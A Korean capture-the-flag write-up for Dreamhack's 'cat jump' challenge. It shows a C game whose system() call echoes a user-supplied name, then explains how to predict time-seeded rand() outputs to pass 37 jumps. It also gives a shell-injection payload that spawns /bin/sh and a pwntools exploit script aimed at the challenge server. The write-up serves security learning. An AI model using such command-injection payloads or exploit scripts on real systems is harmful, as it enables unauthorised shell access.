Dreamhack cat jump 
===================

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

#define CAT_JUMP_GOAL 37

#define CATNIP_PROBABILITY 0.1
#define CATNIP_INVINCIBLE_TIMES 3

#define OBSTACLE_PROBABILITY 0.5
#define OBSTACLE_LEFT  0
#define OBSTACLE_RIGHT 1

void Init() {
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stderr, 0, _IONBF, 0);
}

void PrintBanner() {
    puts("                         .-.\n" \
         "                          \\ \\\n" \
         "                           \\ \\\n" \
         "                            | |\n" \
         "                            | |\n" \
         "          /\\---/\\   _,---._ | |\n" \
         "         /^   ^  \\,'       `. ;\n" \
         "        ( O   O   )           ;\n" \
         "         `.=o=__,'            \\\n" \
         "           /         _,--.__   \\\n" \
         "          /  _ )   ,'   `-. `-. \\\n" \
         "         / ,' /  ,'        \\ \\ \\ \\\n" \
         "        / /  / ,'          (,_)(,_)\n" \
         "       (,;  (,,)      jrei\n");
}

char cmd_fmt[] = "echo \"%s\" > /tmp/cat_db";

void StartGame() {
    char cat_name[32];
    char catnip;
    char cmd[64];
    char input;
    char obstacle;
    double p;
    unsigned char jump_cnt;

    srand(time(NULL));

    catnip = 0;
    jump_cnt = 0;

    puts("let the cat reach the roof! 🐈");

    sleep(1);

    do {
        // set obstacle with a specific probability.
        obstacle = rand() % 2;

        // get input.
        do {
            printf("left jump='h', right jump='j': ");
            scanf("%c%*c", &input);
        } while (input != 'h' && input != 'l');

        // jump.
        if (catnip) {
            catnip--;
            jump_cnt++;
            puts("the cat powered up and is invincible! nothing cannot stop! 🐈");
        } else if ((input == 'h' && obstacle != OBSTACLE_LEFT) ||
                (input == 'l' && obstacle != OBSTACLE_RIGHT)) {
            jump_cnt++;
            puts("the cat jumped successfully! 🐱");
        } else {
            puts("the cat got stuck by obstacle! 😿 🪨 ");
            return;
        }

        // eat some catnip with a specific probability.
        p = (double)rand() / RAND_MAX;
        if (p < CATNIP_PROBABILITY) {
            puts("the cat found and ate some catnip! 😽");
            catnip = CATNIP_INVINCIBLE_TIMES;
        }
    } while (jump_cnt < CAT_JUMP_GOAL);

    puts("your cat has reached the roof!\n");

    printf("let people know your cat's name 😼: ");
    scanf("%31s", cat_name);

    snprintf(cmd, sizeof(cmd), cmd_fmt, cat_name);
    system(cmd);

    printf("goodjob! ");
    system("cat /tmp/cat_db");
}

int main(void) {
    Init();
    PrintBanner();
    StartGame();

    return 0;
}
```


## 코드 분석

`StartGame` 함수는 게임의 핵심 로직을 담고 있다.

1.  **초기화**:
    * `srand(time(NULL))`: **난수 생성기를 현재 시간으로 초기화한다.**
    * `catnip = 0;`: 캣닢 효과는 없다.
    * `jump_cnt = 0;`: 점프 횟수는 0부터 시작한다.

2.  **`do-while` 루프 (핵심 게임 루프)**:
    * 고양이가 목표 점프 횟수(`CAT_JUMP_GOAL`, 즉 37)에 도달할 때까지 루프가 반복된다.
    * **장애물 설정**: `obstacle = rand() % 2;`를 통해 0 또는 1의 값이 무작위로 결정된다. `OBSTACLE_LEFT`는 0, `OBSTACLE_RIGHT`는 1이다. 즉 장애물이 왼쪽 또는 오른쪽에 랜덤으로 나타난다.
    * **사용자 입력 받기**: `h` (왼쪽 점프) 또는 `l` (오른쪽 점프)를 입력받는다.
    * **점프 처리**:
        * **캣닢 효과**: `catnip` 값이 0이 아니라면, 고양이는 캣닢 효과로 **무적 상태**가 된다. 이 상태에서는 장애물에 상관없이 점프 성공 횟수가 증가하고 `catnip` 값은 1 감소한다. 캣닢은 `CATNIP_INVINCIBLE_TIMES`즉 3번의 점프 동안 지속된다.
        * **일반 점프**: 캣닢 효과가 없을 때 사용자의 입력(`input`)과 장애물(`obstacle`)의 위치를 비교한다.
            * **`input == 'h' && obstacle != OBSTACLE_LEFT`**: 왼쪽으로 점프시 장애물이 왼쪽에 없어야 성공한다. (즉 장애물이 오른쪽에 있을 때 왼쪽으로 점프해야 함)
            * **`input == 'l' && obstacle != OBSTACLE_RIGHT`**: 오른쪽으로 점프 시 장애물이 오른쪽에 없어야 성공한다. (즉 장애물이 왼쪽에 있을 때 오른쪽으로 점프해야 함)
            * 둘 중 하나라도 조건이 맞으면 점프 성공, `jump_cnt`가 증가한다.
        * **실패**: 위 조건에 해당하지 않으면 고양이가 장애물에 걸려서 게임이 **`return;`** 된다.
    * **캣닢 획득 확률**: `p = (double)rand() / RAND_MAX;`를 통해 0.0에서 1.0 사이의 무작위 값 `p`를 얻는다. `p` 값이 `CATNIP_PROBABILITY` (0.1)보다 작으면 고양이가 캣닢을 발견하고 먹게 된다. 캣닢을 먹으면 `catnip` 값이 `CATNIP_INVINCIBLE_TIMES` (3)으로 설정되어 다음 3번의 점프 동안 무적 상태가 된다.

3.  **게임 성공**:
    * `jump_cnt`가 `CAT_JUMP_GOAL` (37)에 도달하면 `do-while` 루프를 벗어난다.
    * 고양이 이름을 입력받습니다 (`scanf("%31s", cat_name)`). 이때 최대 31바이트까지 입력받을 수 있다.
    * `snprintf(cmd, sizeof(cmd), cmd_fmt, cat_name);`를 통해 `cmd` 버퍼에 명령어를 생성한다. 
    * `system(cmd);`를 실행하여 이 명령어를 시스템에서 수행한다. 
    * 마지막으로 `/tmp/cat_db` 파일의 내용을 출력한다.


-------------


## 취약점

* 37번의 점프를 성공하면 고양이 이름을 입력받고, 이 이름이 system(cmd); 함수에서 %s 부분에 삽입되어 실행된다.
* system() 함수는 인자로 받은 문자열을 쉘 명령어로 실행한다.
* 문제에서 cmd_fmt가 echo "%s" > /tmp/cat_db와 같은 형태라고 가정해 보자.
  만약 우리가 고양이 이름으로 단순히 "mycat"을 입력하면 system("echo \"mycat\" > /tmp/cat_db");가 실행된다.
* 따라서 고양이 이름 입력을 통해 쉘 명령어를 인젝션할 수 있다. 웹해킹에서 쓰는 SQL 인젝션과 유사하다.

--------

## 37번의 점프 성공

**난수 예측 (Random Number Prediction)**: 게임 중 `rand() % 2`를 통해 장애물 위치가 결정된다. 
37번의 점프를 모두 성공하려면 매번 정확하게 장애물을 피해야 한다.
    * **문제점**: `rand()` 함수는 `srand()`에 의해 초기화된 시드를 기반으로 난수를 생성한다. 
    문제에서는 `srand(time(NULL))`을 사용하므로 난수 시드가 현재 시간에 따라 결정된다.
    * **해결**: 바이너리가 `srand(time(NULL))`을 호출하는 **정확한 시점의 시간**을 알 수 있다면
    같은 `time()` 값을 사용해 로컬에서 `rand()`를 실행하여 다음에 나올 난수 값을 미리 예측할 수 있다.

----------------

## 쉘 인젝션

고양이 이름 입력 시 다음과 같은 문자열을 넣어본다. **`asdf\";/bin/sh;echo\"`**    
이 문자열이 `%s`에 들어가면 `cmd`는 이렇게 된다: `echo "asdf";/bin/sh;echo"" > /tmp/cat_db`
    * `echo "asdf"`: 이 부분은 `asdf`를 출력한다.
    * `/bin/sh`: 쉘을 실행시키는 명령어이다. 
    * `echo"" > /tmp/cat_db`: `echo` 명령어가 빈 문자열을 `/tmp/cat_db`에 쓰는 역할을 한다. 앞의 `/bin/sh`가 실행된 후 뒤의 `echo` 명령어도 정상적으로 실행된다. 즉 'asdf'가 출력되면 쉘이 따진 것을 확인할 수 있다. 

----------------


## 익스플로잇 코드

```python
from pwn import *
from ctypes import CDLL

r = remote("host3.dreamhack.games", 12452)

context.log_level = "debug"

libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6') 
libc.srand(libc.time(0x00)+1)

r.recvuntil(b"let the cat reach the roof! ")
sleep(1)

for i in range(37):
    rand = libc.rand() % 2

    if(rand == 0):
        r.sendlineafter(b"left jump='h', right jump='j': ", b'l')
        
    else:
        r.sendlineafter(b"left jump='h', right jump='j': ", b'h')
    
    libc.rand()

r.sendlineafter(b":", b"asdf\";/bin/sh;echo\"")

r.interactive()
```

원격 서버에서는 로컬의 코드를 실행하는 시점과 서버에서 `rand()`를 호출하는 시점에 약간의 시간 차이가 발생할 수 밖에 없다.   
이걸 체크하고 time을 조정하려고 debug 로그를 출력하도록 넣어놨다.  


-------------

## 실행 결과

<img width="980" height="432" alt="image" src="https://github.com/user-attachments/assets/9966f5e2-7533-4cea-a584-0a20686a516a" />

이렇게 플래그를 구할 수 있다. 
